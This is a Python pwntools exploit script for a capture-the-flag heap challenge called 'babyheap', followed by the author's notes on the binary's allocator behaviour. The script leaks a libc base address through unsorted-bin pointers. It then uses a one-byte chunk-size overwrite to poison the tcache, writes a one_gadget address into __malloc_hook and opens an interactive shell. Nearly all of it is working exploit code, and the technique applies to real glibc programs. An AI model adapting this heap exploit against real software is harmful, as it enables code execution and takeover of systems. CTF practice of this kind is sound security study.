#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyheap")
libc = ELF("./libc.so")
ld = ELF("./ld-2.29.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def malloc(size, content):
    	r.sendline("M")
    	r.sendline(str(size))
    	r.sendline(content)

    def free(idx):
    	r.sendline("F")
    	r.sendline(str(idx))

    def show(idx):
    	r.sendline("S")
    	r.sendline(str(idx))

    # infoleak

    [malloc(0xf8, "") for i in range(7)] # idx 0-6
    malloc(0xf8, "") # idx 7, unsorted bin
    malloc(0xf8, "") # idx 8

    [free(i) for i in range(7)] # free idx 0-6; ; fill tcache binlist
    free(7) # free idx 7, get chunk in unsorted bin
    free(8) # free idx 8, consolidate chunk 7 and chunk 8

    [malloc(0xf8, "A"*0xf8) for i in range(7)] # idx 0-6
    malloc(0x2, "@@@") # idx 7 ; split unsorted chunk, user chunk returned to us will have ptrs to main_arena
    
    show(7)
    r.recvuntil("@")
    leak = u64("\x00" + r.recvn(5) + "\x00\x00")
    libc.address = leak - 0x1e4c00
    one_gadget = libc.address + 0xe2383
    log.info("libc base address: {}".format(hex(libc.address)))
    log.info("__malloc_hook address: {}".format(hex(libc.symbols['__malloc_hook']))) 
    
    # tcache attack, modifying __malloc_hook

    free(3) 
    malloc(0xf8, "A" * 0xf8 + "\x81") # idx 0 ; modify size of chunk 1 to 0x181 -> will be putted in another tcache list
    free(0) 
    r.sendline("F") # program keeps crashing
    free(1)
    r.sendline("F") # program keeps crashing
    free(2)

    r.sendline("M") # program keeps crashing
    malloc(0x178, "A" * 0x100 + p64(libc.symbols['__malloc_hook'])[:6]) # idx 2; overflow into chunk 1, change its next pointer
    
    malloc(0xf8, "") # idx 1
    malloc(0xf8, p64(one_gadget)[:6]) # idx 0
    
    r.sendline("M")
    r.sendline(str(0xf8))
    #gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
'''
reuses indexes
starts from 0x100 alloc
clears heap pointers -> no double free
heap pointers are stored in .bss

malloc:
	10 chunks limit
	heap pointer &DAT_00104060; size &DAT_00104068
	can allocate without content (\n or \x00)
	still uses  our original size for nr of bytes to read ?????
	if ((size & 0xffffffff) < 0xf9)
		malloc(0xf8) 0x101 248
	else
		malloc(0x178) 0x181 376

	zeroes everything?????????

free:
	memsets the whole chunk with 0
	erases heap pointer and size

show:
	calls puts function - info leak no restriction
'''